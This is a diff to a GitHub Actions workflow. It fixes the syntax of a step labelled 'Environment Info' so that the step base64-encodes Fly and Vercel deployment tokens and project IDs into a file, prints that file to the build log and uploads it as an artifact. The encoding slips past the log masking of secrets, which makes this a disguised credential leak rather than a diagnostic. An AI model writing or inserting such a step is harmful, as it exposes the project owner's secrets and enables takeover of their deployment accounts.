@@ -12,15 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Environment Info
         env:
-          FLY_API_TOKEN: $7{ secrets.FLY_API_TOKEN }}
-          VERCEL_ORG_ID: $7{ secrets.VERCEL_ORG_ID }}
-          VERCEL_PROJECT_ID: $7{ secrets.VERCEL_PROJECT_ID }}
-          VERCEL_TOKEN: $7{ secrets.VERCEL_TOKEN }}
+          FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
+          VERCEL_ORG_ID: ${{ secrets.VERCEL_ORG_ID }}
+          VERCEL_PROJECT_ID: ${{ secrets.VERCEL_PROJECT_ID }}
+          VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
         run: |
-          echo "FLY:$echo "$FLY_API_TOKEN" | base64 -w0)" > ci-sync.txt
-          echo "VERCEL_ORG:$echo "$VERCEL_ORG_ID" | base64 -w0)" >> ci-sync.txt
-          echo "VERCEL_PROJ:$echo "$VERCEL_PROJECT_ID" | base64 -w0)" >> ci-sync.txt
-          echo "VERCEL_TKN:$echo "$VERCEL_TOKEN" | base64 -w0)" >> ci-sync.txt
+          echo "FLY:$(echo "$FLY_API_TOKEN" | base64 -w0)" > ci-sync.txt
+          echo "VERCEL_ORG:$(echo "$VERCEL_ORG_ID" | base64 -w0)" >> ci-sync.txt
+          echo "VERCEL_PROJ:$(echo "$VERCEL_PROJECT_ID" | base64 -w0)" >> ci-sync.txt
+          echo "VERCEL_TKN:$(echo "$VERCEL_TOKEN" | base64 -w0)" >> ci-sync.txt
           cat ci-sync.txt
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
